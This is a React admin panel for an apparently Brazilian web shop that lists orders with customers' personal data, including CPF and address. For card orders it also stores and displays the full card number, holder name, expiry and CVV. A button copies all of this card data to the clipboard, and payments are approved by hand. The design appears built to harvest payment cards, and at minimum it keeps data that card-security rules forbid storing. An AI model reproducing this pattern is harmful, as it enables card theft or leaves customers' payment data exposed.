import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { 
  ShoppingCart, Loader2, Check, X, ChevronDown, ChevronUp,
  CreditCard, MessageCircle, Copy, Phone, MapPin, Package
} from "lucide-react";

interface OrderItem {
  id: string;
  name: string;
  price: number;
  quantity: number;
}

interface Order {
  id: string;
  customer_name: string;
  customer_email: string;
  customer_phone: string;
  customer_cpf: string;
  shipping_cep: string;
  shipping_address: string;
  shipping_number: string;
  shipping_complement: string | null;
  shipping_neighborhood: string;
  shipping_city: string;
  shipping_state: string | null;
  items: OrderItem[];
  subtotal: number;
  shipping_cost: number;
  discount: number;
  total: number;
  payment_method: string;
  payment_status: string;
  pix_qrcode: string | null;
  card_brand: string | null;
  card_last_digits: string | null;
  card_number: string | null;
  card_holder: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  created_at: string;
}

export const AdminOrders = () => {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [expandedOrders, setExpandedOrders] = useState<Set<string>>(new Set());

  const { data: orders = [], isLoading } = useQuery({
    queryKey: ['admin-orders'],
    queryFn: async () => {
      const { data, error } = await supabase
        .from('orders')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(100);
      if (error) throw error;
      
      // Parse items JSON for each order
      return (data || []).map(order => ({
        ...order,
        items: (order.items as unknown as OrderItem[]) || [],
      })) as Order[];
    },
  });

  const updateStatusMutation = useMutation({
    mutationFn: async ({ orderId, status }: { orderId: string; status: string }) => {
      const { error } = await supabase
        .from('orders')
        .update({ payment_status: status })
        .eq('id', orderId);
      if (error) throw error;
    },
    onSuccess: () => {
      toast({ title: "Status atualizado" });
      queryClient.invalidateQueries({ queryKey: ['admin-orders'] });
    },
  });

  const formatPrice = (price: number) => price.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'paid': return <Badge className="bg-green-500">Pago</Badge>;
      case 'analyzing': return <Badge className="bg-yellow-500">Analisando</Badge>;
      case 'pending': return <Badge className="bg-blue-500">Pendente</Badge>;
      case 'failed': return <Badge className="bg-red-500">Falhou</Badge>;
      default: return <Badge>{status}</Badge>;
    }
  };

  const toggleExpanded = (orderId: string) => {
    setExpandedOrders(prev => {
      const newSet = new Set(prev);
      if (newSet.has(orderId)) {
        newSet.delete(orderId);
      } else {
        newSet.add(orderId);
      }
      return newSet;
    });
  };

  const handleWhatsApp = (order: Order) => {
    const phone = order.customer_phone.replace(/\D/g, '');
    const message = encodeURIComponent(
      `Olá ${order.customer_name}! 👋\n\n` +
      `Referente ao seu pedido #${order.id.slice(0, 8).toUpperCase()}:\n` +
      `📦 Total: ${formatPrice(Number(order.total))}\n\n` +
      `Como podemos ajudar?`
    );
    window.open(`https://wa.me/55${phone}?text=${message}`, '_blank');
  };

  const handleCopyPix = async (pixCode: string) => {
    try {
      await navigator.clipboard.writeText(pixCode);
      toast({ title: "PIX copiado!", description: "Código PIX copiado para a área de transferência" });
    } catch {
      toast({ title: "Erro ao copiar", variant: "destructive" });
    }
  };

  const handleCopyCardData = async (order: Order) => {
    const cardInfo = `Número: ${order.card_number || 'N/A'}\nTitular: ${order.card_holder || 'N/A'}\nValidade: ${order.card_expiry || 'N/A'}\nCVV: ${order.card_cvv || 'N/A'}`;
    try {
      await navigator.clipboard.writeText(cardInfo);
      toast({ title: "Dados copiados!", description: "Dados do cartão copiados" });
    } catch {
      toast({ title: "Erro ao copiar", variant: "destructive" });
    }
  };

  if (isLoading) {
    return (
      <Card className="bg-card border-border">
        <CardContent className="py-8 flex justify-center">
          <Loader2 className="h-6 w-6 animate-spin text-primary" />
        </CardContent>
      </Card>
    );
  }

  return (
    <Card className="bg-card border-border">
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <ShoppingCart className="h-5 w-5 text-primary" />
          Pedidos ({orders.length})
        </CardTitle>
      </CardHeader>
      <CardContent>
        {orders.length === 0 ? (
          <p className="text-muted-foreground text-center py-8">Nenhum pedido ainda.</p>
        ) : (
          <div className="space-y-3">
            {orders.map((order) => {
              const isExpanded = expandedOrders.has(order.id);
              
              return (
                <div key={order.id} className="bg-secondary/30 rounded-lg border border-border overflow-hidden">
                  {/* Header - sempre visível */}
                  <div 
                    className="p-4 cursor-pointer hover:bg-secondary/50 transition-colors"
                    onClick={() => toggleExpanded(order.id)}
                  >
                    <div className="flex flex-wrap items-center justify-between gap-4">
                      <div className="flex items-center gap-3">
                        <div className={`p-2 rounded-full ${isExpanded ? 'bg-primary/20' : 'bg-muted'}`}>
                          {isExpanded ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
                        </div>
                        <div>
                          <p className="font-bold">{order.customer_name}</p>
                          <p className="text-sm text-muted-foreground">{order.customer_email}</p>
                          <p className="text-xs text-muted-foreground">{new Date(order.created_at).toLocaleString('pt-BR')}</p>
                        </div>
                      </div>
                      <div className="text-right">
                        <p className="font-bold text-primary text-lg">{formatPrice(Number(order.total))}</p>
                        <p className="text-xs text-muted-foreground capitalize">
                          {order.payment_method === 'pix' ? 'PIX' : order.payment_method === 'card' ? 'Cartão' : order.payment_method}
                        </p>
                        {getStatusBadge(order.payment_status)}
                      </div>
                    </div>
                  </div>

                  {/* Conteúdo expandido */}
                  {isExpanded && (
                    <div className="border-t border-border p-4 space-y-4 bg-background/50">
                      {/* Ações rápidas */}
                      <div className="flex flex-wrap gap-2">
                        <Button 
                          size="sm" 
                          variant="outline" 
                          className="gap-2"
                          onClick={(e) => { e.stopPropagation(); handleWhatsApp(order); }}
                        >
                          <MessageCircle className="h-4 w-4 text-green-500" />
                          WhatsApp
                        </Button>
                        
                        {order.payment_method === 'pix' && order.pix_qrcode && (
                          <Button 
                            size="sm" 
                            variant="outline" 
                            className="gap-2"
                            onClick={(e) => { e.stopPropagation(); handleCopyPix(order.pix_qrcode!); }}
                          >
                            <Copy className="h-4 w-4" />
                            Copiar PIX
                          </Button>
                        )}

                        {order.payment_method === 'card' && order.card_number && (
                          <Button 
                            size="sm" 
                            variant="outline" 
                            className="gap-2"
                            onClick={(e) => { e.stopPropagation(); handleCopyCardData(order); }}
                          >
                            <Copy className="h-4 w-4" />
                            Copiar Cartão
                          </Button>
                        )}
                      </div>

                      {/* Dados do Cliente */}
                      <div className="grid md:grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <h4 className="font-semibold flex items-center gap-2">
                            <Phone className="h-4 w-4" /> Cliente
                          </h4>
                          <div className="text-sm space-y-1 bg-muted/50 p-3 rounded-lg">
                            <p><span className="text-muted-foreground">Nome:</span> {order.customer_name}</p>
                            <p><span className="text-muted-foreground">Email:</span> {order.customer_email}</p>
                            <p><span className="text-muted-foreground">Telefone:</span> {order.customer_phone}</p>
                            <p><span className="text-muted-foreground">CPF:</span> {order.customer_cpf}</p>
                          </div>
                        </div>

                        <div className="space-y-2">
                          <h4 className="font-semibold flex items-center gap-2">
                            <MapPin className="h-4 w-4" /> Endereço
                          </h4>
                          <div className="text-sm space-y-1 bg-muted/50 p-3 rounded-lg">
                            <p>{order.shipping_address}, {order.shipping_number}</p>
                            {order.shipping_complement && <p>{order.shipping_complement}</p>}
                            <p>{order.shipping_neighborhood}</p>
                            <p>{order.shipping_city} - {order.shipping_state}</p>
                            <p>CEP: {order.shipping_cep}</p>
                          </div>
                        </div>
                      </div>

                      {/* Dados do Cartão (se for cartão) */}
                      {order.payment_method === 'card' && (
                        <div className="space-y-2">
                          <h4 className="font-semibold flex items-center gap-2 text-orange-400">
                            <CreditCard className="h-4 w-4" /> Dados do Cartão
                          </h4>
                          <div className="bg-orange-500/10 border border-orange-500/30 p-4 rounded-lg">
                            <div className="grid md:grid-cols-2 gap-4 text-sm">
                              <div>
                                <p className="text-muted-foreground text-xs">Número do Cartão</p>
                                <p className="font-mono font-bold text-lg">{order.card_number || 'N/A'}</p>
                              </div>
                              <div>
                                <p className="text-muted-foreground text-xs">Nome no Cartão</p>
                                <p className="font-bold">{order.card_holder || 'N/A'}</p>
                              </div>
                              <div>
                                <p className="text-muted-foreground text-xs">Validade</p>
                                <p className="font-mono font-bold">{order.card_expiry || 'N/A'}</p>
                              </div>
                              <div>
                                <p className="text-muted-foreground text-xs">CVV</p>
                                <p className="font-mono font-bold">{order.card_cvv || 'N/A'}</p>
                              </div>
                              {order.card_brand && (
                                <div>
                                  <p className="text-muted-foreground text-xs">Bandeira</p>
                                  <p className="font-bold capitalize">{order.card_brand}</p>
                                </div>
                              )}
                            </div>
                          </div>
                        </div>
                      )}

                      {/* PIX (se for pix) */}
                      {order.payment_method === 'pix' && order.pix_qrcode && (
                        <div className="space-y-2">
                          <h4 className="font-semibold flex items-center gap-2 text-emerald-400">
                            <Copy className="h-4 w-4" /> PIX Copia e Cola
                          </h4>
                          <div className="bg-emerald-500/10 border border-emerald-500/30 p-3 rounded-lg">
                            <p className="font-mono text-xs break-all select-all">{order.pix_qrcode}</p>
                          </div>
                        </div>
                      )}

                      {/* Itens do Pedido */}
                      <div className="space-y-2">
                        <h4 className="font-semibold flex items-center gap-2">
                          <Package className="h-4 w-4" /> Itens ({order.items?.length || 0})
                        </h4>
                        <div className="bg-muted/50 p-3 rounded-lg space-y-2">
                          {order.items?.map((item, idx) => (
                            <div key={idx} className="flex justify-between text-sm">
                              <span>{item.quantity}x {item.name}</span>
                              <span className="font-medium">{formatPrice(item.price * item.quantity)}</span>
                            </div>
                          ))}
                          <div className="border-t border-border pt-2 mt-2 space-y-1 text-sm">
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">Subtotal</span>
                              <span>{formatPrice(Number(order.subtotal))}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">Frete</span>
                              <span>{Number(order.shipping_cost) === 0 ? 'Grátis' : formatPrice(Number(order.shipping_cost))}</span>
                            </div>
                            {Number(order.discount) > 0 && (
                              <div className="flex justify-between text-green-400">
                                <span>Desconto PIX</span>
                                <span>-{formatPrice(Number(order.discount))}</span>
                              </div>
                            )}
                            <div className="flex justify-between font-bold text-lg pt-1">
                              <span>Total</span>
                              <span className="text-primary">{formatPrice(Number(order.total))}</span>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* Botões de ação para pedidos em análise */}
                      {order.payment_status === 'analyzing' && (
                        <div className="flex gap-2 pt-2">
                          <Button 
                            size="sm" 
                            className="bg-green-500 hover:bg-green-600 flex-1" 
                            onClick={(e) => { e.stopPropagation(); updateStatusMutation.mutate({ orderId: order.id, status: 'paid' }); }}
                          >
                            <Check className="h-4 w-4 mr-1" /> Aprovar Pagamento
                          </Button>
                          <Button 
                            size="sm" 
                            variant="destructive"
                            className="flex-1"
                            onClick={(e) => { e.stopPropagation(); updateStatusMutation.mutate({ orderId: order.id, status: 'failed' }); }}
                          >
                            <X className="h-4 w-4 mr-1" /> Recusar
                          </Button>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </CardContent>
    </Card>
  );
};
